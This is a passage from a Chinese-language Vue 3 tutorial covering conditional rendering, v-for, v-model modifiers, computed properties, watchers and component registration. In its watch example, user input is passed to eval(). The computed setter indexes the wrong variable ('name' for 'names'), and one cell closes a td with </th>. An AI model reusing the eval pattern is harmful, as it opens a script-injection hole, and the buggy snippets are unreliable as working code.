class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vif&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;score &gt;= 90&quot;</span>&gt;</span>v-if 90<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">&quot;score &gt;= 80&quot;</span>&gt;</span>v-if 80<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">v-else</span>&gt;</span>v-if else<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//v-if 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vif = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">score</span>: <span class="hljs-number">86</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#vif&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><p><code>v-show</code> 和 <code>v-if</code> 类似，都能决定元素是否显示，区别在于条件为 false 时：</p><ul><li><code>v-if</code> 修饰的元素根本不会在 DOM 中</li><li><code>v-show</code> 是新增一个行内样式 <code>display:none</code></li></ul><p>而条件为 true 时：</p><ul><li><code>v-if</code> 会再创建一个元素</li><li><code>v-show</code> 只需要把 <code>display</code> 属性去掉即可</li></ul><p>因此，当需要频繁切换时 <code>v-show</code> 更好，反之 <code>v-if</code> 更好</p><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><p>使用 <code>v-for</code> 遍历数组和对象，绑定 <code>key</code> 值避免出错（<code>key</code> 只能用字符串或数字）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vfor&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border-collapse: collapse;&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;item in items&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(item,index) in info&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: 1px solid #000;&quot;</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: 1px solid #000;&quot;</span>&gt;</span>&#123;&#123; item.age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//v-for 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vfor = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">items</span>: [<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;age&#x27;</span>],</span><br><span class="language-javascript">                <span class="hljs-attr">info</span>:[&#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Judy&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">age</span>: <span class="hljs-number">31</span></span><br><span class="language-javascript">                &#125;,&#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Tom&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">age</span>: <span class="hljs-number">24</span></span><br><span class="language-javascript">                &#125;]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#vfor&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="数据双向绑定"><a href="#数据双向绑定" class="headerlink" title="数据双向绑定"></a>数据双向绑定</h2><h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><p><code>v-model</code> 用以实现表单元素和数据的双向绑定，实际上就是两个语法的结合（<code>v-bind</code> 绑定一个<code>value</code> 属性，<code>v-on</code> 给当前元素绑定<code>input</code> 事件），可参考 <code>v-on</code> 修饰符代码实例</p><h3 id="v-model-中的修饰符"><a href="#v-model-中的修饰符" class="headerlink" title="v-model 中的修饰符"></a>v-model 中的修饰符</h3><ul><li><code>lazy</code> ：默认情况下，<code>v-model</code> 是在 input 事件中同步输入框的数据，一旦数据有变，data 里面的数据也会自动改变；但有时我们不想让 data 中的数据立刻发生改变，就可以用 <code>lazy</code> 修饰符，让数据失去焦点或回车时才更新</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.lazy</span>=<span class="hljs-string">&quot;message&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>number</code> ：当我们往 input 里输入数字时，Vue 会自动把这些数字识别成字符串，如果想以数字的格式存储它，那么就需要添加 <code>number</code> 修饰符</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.number</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>trim</code> ：如果想要去除 input 框中输入的空格，需要添加 <code>trim</code> 修饰符</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.trim</span>=<span class="hljs-string">&quot;message&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="三、数据控制"><a href="#三、数据控制" class="headerlink" title="三、数据控制"></a>三、数据控制</h1><h2 id="计算属性-computed"><a href="#计算属性-computed" class="headerlink" title="计算属性 computed"></a>计算属性 computed</h2><p>当需要对 data 里面的数据进行处理并显示时，需要用到 <code>computed</code> 属性。</p><p>相比 <code>methods</code> ，从最终的实现结果来看，两种方式是完全相同。然而，不同的是，<strong>计算属性将基于它们的响应依赖关系进行缓存</strong>，即计算属性只会在相关响应式依赖发生改变时重新求值，只要相关响应式依赖没有改变，计算属性会立即返回之前的计算结果，不必再重新执行函数。</p><p>因此，对于任何包含响应式数据的复杂逻辑，你都应该使用 <strong>计算属性</strong> 。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;computed&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span><br>           &#123;&#123; fullname &#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//computed 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> computed = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">firstname</span>: <span class="hljs-string">&quot;Stephen&quot;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">lastname</span>: <span class="hljs-string">&quot;Curry&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">fullname</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;computed-test: &quot;</span>+ <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstname</span> + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastname</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#computed&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h3 id="计算属性的-Setter"><a href="#计算属性的-Setter" class="headerlink" title="计算属性的 Setter"></a>计算属性的 Setter</h3><p>计算属性默认只有 getter，不过在需要的时候你也可以提供一个 setter，更新相应的依赖。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;computed&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span><br>           &#123;&#123; fullname &#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//computed 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> computed = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">firstname</span>: <span class="hljs-string">&quot;Stephen&quot;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">lastname</span>: <span class="hljs-string">&quot;Curry&quot;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">fullname</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;computed-test: &quot;</span>+ <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstname</span> + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastname</span></span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-title function_">set</span>(<span class="hljs-params">fullname</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">const</span> names = fullname.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstname</span> = name[names.<span class="hljs-property">length</span> - <span class="hljs-number">2</span>]</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastname</span> = name[names.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#computed&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="侦听器-watch"><a href="#侦听器-watch" class="headerlink" title="侦听器 watch"></a>侦听器 watch</h2><p>Vue 通过 <code>watch</code> 自定义侦听器用于对数据进行监控，当监视的变量发生变化，监视器定义的响应操作会自动执行。</p><p>当需要在数据变化时执行异步操作或开销较大的操作时，这个方式是最有用的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;watch&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>            Do an add calculation:<br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;expr&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; answer &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//watch 语法</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> watchExampleVM = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">expr</span>: <span class="hljs-string">&#x27;1+1?&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">answer</span>: <span class="hljs-string">&#x27;2&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">watch</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// 每当 question 发生变化时，该函数将会执行</span></span><br><span class="language-javascript">            <span class="hljs-title function_">expr</span>(<span class="hljs-params">newValue, oldValue</span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (newValue.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;?&#x27;</span>) &gt; -<span class="hljs-number">1</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>()</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">getAnswer</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                exprs = <span class="hljs-variable language_">this</span>.<span class="hljs-property">expr</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;?&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;+&quot;</span>)</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">answer</span> = <span class="hljs-built_in">eval</span>(exprs[<span class="hljs-number">0</span>])+<span class="hljs-built_in">eval</span>(exprs[<span class="hljs-number">1</span>])</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&#x27;#watch&#x27;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="四、组件基础"><a href="#四、组件基础" class="headerlink" title="四、组件基础"></a>四、组件基础</h1><p>组件（Component）是 Vue.js 最强大的功能之一，组件可以扩展HTML元素，封装可重用代码，在较高层面上，组件是自定义元素，Vue.js 的编译器为它添加特殊功能。</p><h2 id="组件注册"><a href="#组件注册" class="headerlink" title="组件注册"></a>组件注册</h2><h3 id="组件名"><a href="#组件名" class="headerlink" title="组件名"></a>组件名</h3><p>尽管当使用 PascalCase (首字母大写命名) 定义一个组件时，你在引用这个自定义元素时两种命名法都可以使用。也就是说 <code>&lt;my-component-name&gt;</code> 和 <code>&lt;MyComponentName&gt;</code> 都是可接受的。但实际上，直接在 DOM (即非字符串的模板) 中使用时只有 kebab-case （短横线分割命名）是有效的。 </p><h3 id="全局注册"><a href="#全局注册" class="headerlink" title="全局注册"></a>全局注册</h3><p>使用 <code>app.component</code> 来全局注册组件，也就是说这些组件在注册之后可以用在任何新创建的组件实例模板中；在各子组件中也是如此，子组件内部也可以相互使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mycomponent&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">my-component-a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component-a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//全局注册</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> mycomponent = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;&#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    mycomponent.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;my-component-a&#x27;</span>,&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>: <span class="hljs-string">&quot;&lt;div&gt;My Component A&lt;/div&gt;&quot;</span></span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    mycomponent.<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#mycomponent&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="局部注册"><a href="#局部注册" class="headerlink" title="局部注册"></a>局部注册</h3><p>全局注册往往是不够理想的。比如，如果你使用一个像 webpack 这样的构建系统，全局注册所有的组件意味着即便你已经不再使用其中一个组件了，它仍然会被包含在最终的构建结果中。这造成了用户下载的 JavaScript 的无谓的增加。 </p><p> 在这些情况下，你可以通过一个普通的 JavaScript 对象来定义组件 ，在 <code>components</code> 选项中定义想要使用的组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mycomponent&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">local-component-a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">local-component-a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//局部注册</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title class_">ComponentA</span> = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>: <span class="hljs-string">&quot;&lt;div&gt;My Component A&lt;/div&gt;&quot;</span></span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> mycomponent1 = <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">createApp</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-string">&#x27;local-component-a&#x27;</span>: <span class="hljs-title class_">ComponentA</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;).<span class="hljs-title function_">mount</span>(<span class="hljs-string">&quot;#mycomponent&quot;</span>)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注意 <strong>局部注册的组件在其子组件中不可用</strong> ， 如果你希望 <code>ComponentA</code> 在 <code>ComponentB</code> 中可用，则需要这样写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ComponentA</span> = &#123;<br>  <span class="hljs-comment">/* ... */</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ComponentB</span> = &#123;<br>  <span class="hljs-attr">components</span>: &#123;<br>    <span class="hljs-string">&#x27;component-a&#x27;</span>: <span class="hljs-title class_">ComponentA</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="编译作用域"><a href="#编译作用域" class="headerlink" title="编译作用域"></a>编译作用域</h2><p>父组件模板的内容在父组件作用域内编译；子组件模板的内容在子组件作用域内编译。一个常见的错误是试图在父组件模板内将一个指令绑定到子组件的属性 &#x2F; 方法上</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">child-component</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;childProperty&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">child-component</span>&gt;</span><br></code></pre></td></tr></table></figure><p>假定 <code>childProperty</code> 